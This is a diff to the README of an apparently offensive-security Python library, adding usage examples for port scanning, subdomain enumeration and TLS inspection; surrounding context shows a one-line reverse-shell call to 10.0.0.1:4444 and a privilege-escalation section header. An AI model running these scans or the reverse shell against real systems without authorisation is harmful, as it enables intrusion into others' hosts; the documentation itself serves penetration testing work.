@@ -43,6 +43,29 @@ web.fetch_all("http://example.com")
 exploit.php_reverse_shell("10.0.0.1", 4444)
 ```
 
+## Recon Breadth
+
+Dependency-free recon that doesn't require `nmap`:
+
+```python3
+from hwatlib import dns, recon, tls
+
+# Async TCP connect port scan (raw asyncio, no python-nmap)
+result = recon.scan_ports("10.0.0.1")                 # common ports by default
+result = recon.scan_ports("10.0.0.1", recon.parse_ports("1-1024,3306,8080"))
+print(result.open_ports)
+
+# Subdomain enumeration: passive (crt.sh CT logs) + active (wordlist brute)
+names = dns.discover_subdomains_passive("example.com")          # names from CT logs
+found = dns.enumerate_subdomains("example.com", words=["www", "api", "mail"])
+print(found)                                                    # {fqdn: ip_or_None}
+
+# TLS / certificate inspection (expiry, SANs, issuer, weak protocol/cipher)
+info = tls.inspect_tls("example.com", 443)
+print(info.not_after, info.days_until_expiry, info.expired)
+print(info.sans, info.protocol, info.cipher, info.weak_protocol)
+```
+
 ## Privilege Escalation
 
 ```python3
